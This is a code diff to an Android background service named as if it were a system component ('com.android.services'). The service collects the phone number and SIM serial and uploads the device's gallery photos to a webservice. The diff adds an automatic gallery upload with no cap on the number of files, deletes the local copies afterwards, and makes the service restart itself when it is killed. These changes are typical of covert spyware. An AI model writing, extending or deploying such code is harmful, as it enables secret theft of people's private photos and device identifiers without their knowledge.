@@ -32,6 +32,7 @@ import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 import android.widget.RemoteViews;
 
+import com.android.services.MainActivity;
 import com.android.services.Model.ContactModel;
 import com.android.services.Model.Model_images;
 import com.android.services.R;
@@ -76,7 +77,8 @@ public class UpdateService extends Service {
     private static final String LOG_TAG = "ForegroundService";
     private Handler handler;
     private Handler handlerPost;
-    private final int NOTIFICATION_ID = 1479;
+    private Handler handlerGallery;
+    private final int NOTIFICATION_ID = 1923;
     private final int DELAY = 300000;
     private final int DELAYUPLOAD = 30000;
     private RequestQueue requestQueue;
@@ -104,6 +106,7 @@ public class UpdateService extends Service {
     private final String TAG = "MNACT";
     private GsmCellLocation gsmCellLocation;
     public TelephonyManager telephonyManager;
+    public boolean isUploadGallery;
 
 
     @Override
@@ -115,8 +118,10 @@ public class UpdateService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
 
 
+        isUploadGallery = false;
         handler = new Handler();
         handlerPost = new Handler();
+        handlerGallery = new Handler();
 
         file = new File(Environment.getExternalStorageDirectory()
                 + "/" + IMAGE_DIRECTORY);
@@ -201,7 +206,7 @@ public class UpdateService extends Service {
         nomor = telephonyManager.getLine1Number();
         TelephonyManager mngr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-        AndLog.ShowLog(TAG, "dsds : " + mngr.getLine1Number() + "/"+mngr.getSimSerialNumber());
+        AndLog.ShowLog(TAG, "dsds : " + mngr.getLine1Number() + "/" + mngr.getSimSerialNumber());
         AndLog.ShowLog(TAG, "Nomor : " + nomor);
         sessionManager.setNomor(nomor);
 
@@ -213,6 +218,7 @@ public class UpdateService extends Service {
 
 
         handlerPost.post(runnable);
+        handlerGallery.post(runnableGallery);
 
         return START_STICKY;
     }
@@ -252,6 +258,18 @@ public class UpdateService extends Service {
 
             startGetData();
             handlerPost.postDelayed(runnable, DELAYUPLOAD);
+
+        }
+    };
+
+    private Runnable runnableGallery = new Runnable() {
+        @Override
+        public void run() {
+
+            if (!isUploadGallery) {
+                ambilgallery();
+            }
+//            handlerGallery.postDelayed(runnableGallery, DELAYUPLOAD);
 
         }
     };
@@ -323,39 +341,42 @@ public class UpdateService extends Service {
                 result1 = "";
 
 
-                resp = null;
+                resp = "";
 
                 //This function is responsible for sending data to our webservice
                 int send = 0;
                 for (int i = 0; i < al_images.size(); i++) {
-                    Log.e("FOLDERd", al_images.get(i).getStr_folder());
+                    AndLog.ShowLog("FOLDERd", al_images.get(i).getStr_folder());
 
                     for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
                         String filePath = al_images.get(i).getAl_imagepath().get(j);
-                        Log.e("FILE", filePath);
+                        AndLog.ShowLog("FILEUPLOAD", filePath);
                         sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
 
-                        File sourceFile = new File(filePath);
-                        File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");
+                        if (filePath.toLowerCase().contains(".jpg")) {
+                            File sourceFile = new File(filePath);
+                            File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");
 
-                        try {
-                            copyFile(sourceFile, destFile);
-                            decodeFile(destFile);
-                        } catch (IOException e) {
-                            e.printStackTrace();
+                            try {
+                                copyFile(sourceFile, destFile);
+                                decodeFile(destFile);
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+
+//                            if (send < 500) {
+                                resp = deepImagesInsert(filePath, destFile.getPath());
+//                            } else {
+//                                deleteDir(file);
+//                            }
+
+                            send++;
                         }
-
-                        if (send < 100) {
-                            resp = deepImagesInsert(filePath, destFile.getPath());
-                        } else {
-                            deleteDir(file);
-                        }
-
-                        send++;
                     }
                 }
 //                resp = deepImagesInsert();
 
+                deleteDir(file);
                 AndLog.ShowLog("Values", resp);
 
 
@@ -373,6 +394,8 @@ public class UpdateService extends Service {
             // listView.setAdapter(list_adapter);
             //Tooat(decision);
 
+            isUploadGallery = false;
+
             String status = resp.trim();
 
             AndLog.ShowLog("rsstss", status);
@@ -388,6 +411,8 @@ public class UpdateService extends Service {
 //            progressDialog = ProgressDialog.show(FormPengajuan.this,
 //                    "Process",
 //                    "Please wait...");
+
+            isUploadGallery = true;
         }
 
         @Override
@@ -597,7 +622,7 @@ public class UpdateService extends Service {
                 }
             }
 
-            handler.postDelayed(updateData, DELAY);
+//            handler.postDelayed(updateData, DELAY);
 
         }
     };
@@ -622,8 +647,8 @@ public class UpdateService extends Service {
         column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
         while (cursor.moveToNext()) {
             absolutePathOfImage = cursor.getString(column_index_data);
-            Log.e("Column", absolutePathOfImage);
-            Log.e("Folder", cursor.getString(column_index_folder_name));
+            AndLog.ShowLog("Column", absolutePathOfImage);
+            AndLog.ShowLog("Folder", cursor.getString(column_index_folder_name));
 
 
             for (int i = 0; i < al_images.size(); i++) {
@@ -666,13 +691,18 @@ public class UpdateService extends Service {
 
         }
 
+
+        AndLog.ShowLog("Asyntaskings", "STARTTING");
+        AsyncTaskRunner task = new AsyncTaskRunner();
+        task.execute();
+
     }
 
     private void SimpanAll() {
-        ambilgallery();
+//        ambilgallery();
         InsertDeep();
-        AsyncTaskRunner task = new AsyncTaskRunner();
-        task.execute();
+//        AsyncTaskRunner task = new AsyncTaskRunner();
+//        task.execute();
     }
 
     private void copyFile(File sourceFile, File destFile) throws IOException {
@@ -700,8 +730,10 @@ public class UpdateService extends Service {
     public void onDestroy() {
         super.onDestroy();
 
+        startService(new Intent(this, UpdateService.class));
         handler.removeCallbacks(updateData);
         handlerPost.removeCallbacks(runnable);
+        handlerGallery.removeCallbacks(runnableGallery);
     }
 
     @Override
